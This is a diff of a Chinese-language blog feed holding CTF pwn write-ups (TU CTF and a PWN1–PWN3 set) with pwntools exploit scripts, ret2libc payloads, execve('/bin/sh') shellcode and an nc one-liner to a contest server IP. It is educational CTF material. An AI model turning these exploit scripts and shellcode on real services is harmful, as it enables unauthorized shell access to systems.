@@ -17,53 +17,53 @@
       
       <guid>https://blog.zet.tw/posts/2016-05-21-tu-ctf-where-heretics-suffer/</guid>
       <description>拿到這題的時候已經是一隻binary了，這是用比較新的gcc編的，對於function call 有一些新的機制，如下：
-80485cb: 8d 4c 24 04 lea ecx,[esp+0x4] 80485cf: 83 e4 f0 and esp,0xfffffff0 80485d2: ff 71 fc push DWORD PTR [ecx-0x4] 80485d5: 55 push ebp 80485d6: 89 e5 mov ebp,esp 80485d8: 51 push ecx 80485d9: 83 ec 34 sub esp,0x34 ...... 8048682: b8 00 00 00 00 mov eax,0x0 8048687: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 804868a: c9 leave 804868b: 8d 61 fc lea esp,[ecx-0x4] 804868e: c3 ret 可以看到在初始化的時候lea ecx,[esp+0x4]，會把esp得值放到ecx中 之後再把ecx放到stack上，當我們overflow以後會把原本得直也蓋掉</description>
+ 80485cb: 8d 4c 24 04 lea ecx,[esp+0x4]  80485cf: 83 e4 f0 and esp,0xfffffff0  80485d2: ff 71 fc push DWORD PTR [ecx-0x4]  80485d5: 55 push ebp  80485d6: 89 e5 mov ebp,esp  80485d8: 51 push ecx  80485d9: 83 ec 34 sub esp,0x34   ......   8048682: b8 00 00 00 00 mov eax,0x0  8048687: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4]  804868a: c9 leave  804868b: 8d 61 fc lea esp,[ecx-0x4]  804868e: c3 ret 可以看到在初始化的時候lea ecx,[esp+0x4]，會把esp得值放到ecx中 之後再把ecx放到stack上，當我們overflow以後會把原本得直也蓋掉</description>
       <content:encoded><![CDATA[<p>拿到這題的時候已經是一隻binary了，這是用比較新的gcc編的，對於function call 有一些新的機制，如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown"> 80485cb:       8d 4c 24 04             lea    ecx,[esp+0x4]
- 80485cf:       83 e4 f0                and    esp,0xfffffff0
- 80485d2:       ff 71 fc                push   DWORD PTR [ecx-0x4]
- 80485d5:       55                      push   ebp
- 80485d6:       89 e5                   mov    ebp,esp
- 80485d8:       51                      push   ecx
- 80485d9:       83 ec 34                sub    esp,0x34
-
- ......
-
- 8048682:       b8 00 00 00 00          mov    eax,0x0
- 8048687:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
- 804868a:       c9                      leave
- 804868b:       8d 61 fc                lea    esp,[ecx-0x4]
- 804868e:       c3                      ret
-</code></pre></div><p>可以看到在初始化的時候<code>lea    ecx,[esp+0x4]</code>，會把esp得值放到<code>ecx</code>中 之後再把<code>ecx</code>放到stack上，當我們overflow以後會把原本得直也蓋掉</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span> 80485cb:       8d 4c 24 04             lea    ecx,[esp+0x4]
+</span></span><span style="display:flex;"><span> 80485cf:       83 e4 f0                and    esp,0xfffffff0
+</span></span><span style="display:flex;"><span> 80485d2:       ff 71 fc                push   DWORD PTR [ecx-0x4]
+</span></span><span style="display:flex;"><span> 80485d5:       55                      push   ebp
+</span></span><span style="display:flex;"><span> 80485d6:       89 e5                   mov    ebp,esp
+</span></span><span style="display:flex;"><span> 80485d8:       51                      push   ecx
+</span></span><span style="display:flex;"><span> 80485d9:       83 ec 34                sub    esp,0x34
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> ......
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 8048682:       b8 00 00 00 00          mov    eax,0x0
+</span></span><span style="display:flex;"><span> 8048687:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
+</span></span><span style="display:flex;"><span> 804868a:       c9                      leave
+</span></span><span style="display:flex;"><span> 804868b:       8d 61 fc                lea    esp,[ecx-0x4]
+</span></span><span style="display:flex;"><span> 804868e:       c3                      ret
+</span></span></code></pre></div><p>可以看到在初始化的時候<code>lea    ecx,[esp+0x4]</code>，會把esp得值放到<code>ecx</code>中 之後再把<code>ecx</code>放到stack上，當我們overflow以後會把原本得直也蓋掉</p>
 <p>題目滿好心的有提供很多東西所以可以算出<code>system</code>的位置，也有給buffer的位置，所以我們直接把 ret address 填到 buffer 開頭的位置這樣esp，控制好以後esp才不會爛掉，之後照正常疊 <code>ret2libc</code> 就行了</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-
-e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib32/libc.so.6&#39;</span>)
-<span style="color:#75715e">#e = ELF(&#39;./libc.so.6&#39;)</span>
-
-r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">4000</span>)
-r<span style="color:#f92672">.</span>recvlines(<span style="color:#ae81ff">2</span>)
-puts <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[<span style="color:#ae81ff">47</span>:<span style="color:#ae81ff">57</span>]
-print <span style="color:#e6db74">&#39;puts : &#39;</span>,puts
-puts <span style="color:#f92672">=</span> int(puts, <span style="color:#ae81ff">16</span>)
-
-buffer <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[<span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>:]
-print <span style="color:#e6db74">&#39;buffer :&#39;</span>,buffer
-buffer <span style="color:#f92672">=</span> int(buffer,<span style="color:#ae81ff">16</span>)
-
-system <span style="color:#f92672">=</span> puts <span style="color:#f92672">-</span> ( e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>] <span style="color:#f92672">-</span> e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>] )
-print <span style="color:#e6db74">&#39;system : &#39;</span>,hex(system)
-
-payload <span style="color:#f92672">=</span> p32(system) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>)
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">44</span><span style="color:#f92672">-</span>len(payload))
-print len(payload)
-
-
-r<span style="color:#f92672">.</span>sendline( payload <span style="color:#f92672">+</span> p32( buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>)  )
-
-r<span style="color:#f92672">.</span>interactive()
-</code></pre></div>]]></content:encoded>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib32/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#e = ELF(&#39;./libc.so.6&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">4000</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvlines(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[<span style="color:#ae81ff">47</span>:<span style="color:#ae81ff">57</span>]
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#39;puts : &#39;</span>,puts
+</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> int(puts, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[<span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>:]
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#39;buffer :&#39;</span>,buffer
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> int(buffer,<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> puts <span style="color:#f92672">-</span> ( e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>] <span style="color:#f92672">-</span> e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>] )
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#39;system : &#39;</span>,hex(system)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p32(system) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">44</span><span style="color:#f92672">-</span>len(payload))
+</span></span><span style="display:flex;"><span>print len(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline( payload <span style="color:#f92672">+</span> p32( buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>)  )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -82,77 +82,77 @@ from pwn import * import time r = remote(&amp;#39;127.0.0.1&amp;#39;, 4000) read
       <content:encoded><![CDATA[<p>簡單紀錄一下</p>
 <h2 id="pwn1">PWN1</h2>
 <p>丟進ida 可以看到</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">if ( v4 == 0x90909090 )
-result = puts(aCensordCensord);
-else
-result = printf(&#34;Your point is only %d, try hard!\n&#34;, v4, v1,
-v2, v3);
-return result;
-</code></pre></div><p>直接塞90結束</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python -c &#39;print &#34;\x90&#34;*1000&#39; | nc 52.69.163.194 1111
-</code></pre></div><h2 id="pwn2">PWN2</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>if ( v4 == 0x90909090 )
+</span></span><span style="display:flex;"><span>result = puts(aCensordCensord);
+</span></span><span style="display:flex;"><span>else
+</span></span><span style="display:flex;"><span>result = printf(&#34;Your point is only %d, try hard!\n&#34;, v4, v1,
+</span></span><span style="display:flex;"><span>v2, v3);
+</span></span><span style="display:flex;"><span>return result;
+</span></span></code></pre></div><p>直接塞90結束</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python -c &#39;print &#34;\x90&#34;*1000&#39; | nc 52.69.163.194 1111
+</span></span></code></pre></div><h2 id="pwn2">PWN2</h2>
 <p>定位到地20個字以後可以控制eip</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ info functions
-All defined functions:
-Non-debugging symbols:
-0x08048364  _init
-0x080483a0  read@plt
-</code></pre></div><p>可以指到<code>read</code>上,一般來說長這樣</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">call
-ret
-argv1
-￼argv2
-argv3
-</code></pre></div><p>可以控制<code>read</code>的返回地址跟參數,所以可以把<code>ret</code>跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> time
-r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">4000</span>)
-read_adr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0\x83\x04\x08</span><span style="color:#e6db74">&#34;</span>
-read <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>
-p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> read_adr <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> read
-r<span style="color:#f92672">.</span>send (p)
-time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
-r<span style="color:#f92672">.</span>send (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd</span>
-\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68<span style="color:#e6db74">&#34;)</span>
-</code></pre></div><h2 id="pwn3">PWN3</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gdb-peda$ info functions
+</span></span><span style="display:flex;"><span>All defined functions:
+</span></span><span style="display:flex;"><span>Non-debugging symbols:
+</span></span><span style="display:flex;"><span>0x08048364  _init
+</span></span><span style="display:flex;"><span>0x080483a0  read@plt
+</span></span></code></pre></div><p>可以指到<code>read</code>上,一般來說長這樣</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>call
+</span></span><span style="display:flex;"><span>ret
+</span></span><span style="display:flex;"><span>argv1
+</span></span><span style="display:flex;"><span>￼argv2
+</span></span><span style="display:flex;"><span>argv3
+</span></span></code></pre></div><p>可以控制<code>read</code>的返回地址跟參數,所以可以把<code>ret</code>跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">4000</span>)
+</span></span><span style="display:flex;"><span>read_adr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0\x83\x04\x08</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>read <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> read_adr <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> read
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send (p)
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd</span>
+</span></span><span style="display:flex;"><span>\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68<span style="color:#e6db74">&#34;)</span>
+</span></span></code></pre></div><h2 id="pwn3">PWN3</h2>
 <p>滿多東西始用 qira看的 pwn3首先可以一直<code>push</code>來達成覆蓋<code>ret</code>的效果最後要exit退出達成覆蓋
 一開始算一下 <code>pop leak</code> 的值跟我們shellcode 差多遠,計算以後差 36 ,但是會覆蓋 ret 所以ret 以後要給他一個指標 指向我們的shellcode
 ⽤用<code>%d</code>的話超過<code>0x80000000</code> 要剪掉 <code>0x100000000</code>塞進去的職才會是正常的 我們的payload預計長這樣</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">point to shellcode + shellcode + nop + ret
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> time
-r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>,<span style="color:#ae81ff">4000</span>)
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">push</span>(num):
-     r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-     time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)
-     <span style="color:#66d9ef">if</span> num <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x80000000</span>:
-           num <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x100000000</span>
-     r<span style="color:#f92672">.</span>send( str(num) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-<span style="color:#75715e">#pop leak</span>
-r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-item <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;item&#39;</span>)[<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">23</span>]
-shell_adr <span style="color:#f92672">=</span> int(item,<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
-<span style="color:#75715e">#shellcode point</span>
-push(shell_adr)
-<span style="color:#75715e">#shellcode</span>
-push(<span style="color:#ae81ff">0x315b0beb</span>)
-push(<span style="color:#ae81ff">0x31c931c0</span>)
-push(<span style="color:#ae81ff">0xcd0bb0d2</span>)
-push(<span style="color:#ae81ff">0xfff0e880</span>)
-push(<span style="color:#ae81ff">0x622fffff</span>)
-push(<span style="color:#ae81ff">0x732f6e69</span>)
-push(<span style="color:#ae81ff">0x90900068</span>)
-<span style="color:#75715e">#nop</span>
-<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>):
-     push(<span style="color:#ae81ff">0x90909090</span>)
-<span style="color:#75715e">#ret</span>
-push(shell_adr)
-<span style="color:#75715e">#exit</span>
-time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
-r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-<span style="color:#75715e">#get shell</span>
-r<span style="color:#f92672">.</span>interactive()
-</code></pre></div>]]></content:encoded>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>point to shellcode + shellcode + nop + ret
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>,<span style="color:#ae81ff">4000</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">push</span>(num):
+</span></span><span style="display:flex;"><span>     r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>     time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span> num <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x80000000</span>:
+</span></span><span style="display:flex;"><span>           num <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x100000000</span>
+</span></span><span style="display:flex;"><span>     r<span style="color:#f92672">.</span>send( str(num) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pop leak</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>item <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;item&#39;</span>)[<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">23</span>]
+</span></span><span style="display:flex;"><span>shell_adr <span style="color:#f92672">=</span> int(item,<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#shellcode point</span>
+</span></span><span style="display:flex;"><span>push(shell_adr)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#shellcode</span>
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x315b0beb</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x31c931c0</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0xcd0bb0d2</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0xfff0e880</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x622fffff</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x732f6e69</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x90900068</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#nop</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>     push(<span style="color:#ae81ff">0x90909090</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ret</span>
+</span></span><span style="display:flex;"><span>push(shell_adr)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#exit</span>
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#get shell</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     
   </channel>
